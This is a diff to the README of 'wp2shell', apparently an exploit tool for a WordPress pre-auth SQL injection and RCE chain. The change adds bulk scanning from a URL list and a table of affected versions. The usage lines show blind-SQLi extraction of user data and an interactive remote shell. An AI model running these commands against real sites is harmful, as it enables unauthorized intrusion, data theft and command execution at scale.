@@ -19,11 +19,16 @@ WordPress Pre-Auth RCE via REST Batch Route Confusion + WP_Query SQL Injection.
 ### Commands
 
 ```bash
-# Scan — detect version + route confusion + blind SQLi
+# Single target scan
 python3 wp2shell.py -t <url> scan
 python3 wp2shell.py -t <url> scan -o report.json
-python3 wp2shell.py -t <url> scan --sleep 2 --rounds 5
-python3 wp2shell.py -t <url> -d scan            # debug mode
+python3 wp2shell.py -t <url> scan --sleep 5 --rounds 5
+python3 wp2shell.py -t <url> -d scan                    # debug mode
+
+# Bulk scan from file (one URL per line)
+python3 wp2shell.py -l targets.txt scan
+python3 wp2shell.py -l targets.txt scan -o report.csv
+python3 wp2shell.py -l targets.txt scan --sleep 2 --rounds 2
 
 # Read — extract data via pre-auth blind SQLi
 python3 wp2shell.py -t <url> read --preset fingerprint
@@ -34,14 +39,15 @@ python3 wp2shell.py -t <url> read --preset users -o users.csv
 
 # Shell — post-auth RCE (requires admin credentials)
 python3 wp2shell.py -t <url> shell -u admin -p <password> -c id
-python3 wp2shell.py -t <url> shell -u admin -p <password>         # interactive
+python3 wp2shell.py -t <url> shell -u admin -p <password>              # interactive
 ```
 
 ### Flags
 
 | Flag | Description |
 |------|-------------|
-| `-t, --target` | WordPress URL |
+| `-t, --target` | Single WordPress URL |
+| `-l, --list` | File with list of URLs to scan (one per line) |
 | `-o, --output` | Export results (`.json` / `.csv`) |
 | `-d, --debug` | Show raw HTTP requests & responses |
 | `--sleep` | SLEEP seconds for SQLi timing (default: 3) |
@@ -49,6 +55,15 @@ python3 wp2shell.py -t <url> shell -u admin -p <password>         # interactive
 | `--timeout` | HTTP timeout seconds (default: 30) |
 | `--proxy` | HTTP proxy |
 | `--ua` | Custom User-Agent |
+
+### Scan Behavior
+
+| Version | Action |
+|---------|--------|
+| 6.8.0–6.8.5, 6.9.0–6.9.4, 7.0.0–7.0.1 | Full scan (version + confusion + SQLi) |
+| Other WP ≥ 5.6 | Version check → skip (not affected) |
+| WP < 5.6 | Skip (no batch API) |
+| Not WordPress | Skip (batch unavailable) |
 
 ### Scan Output (vulnerable)
 
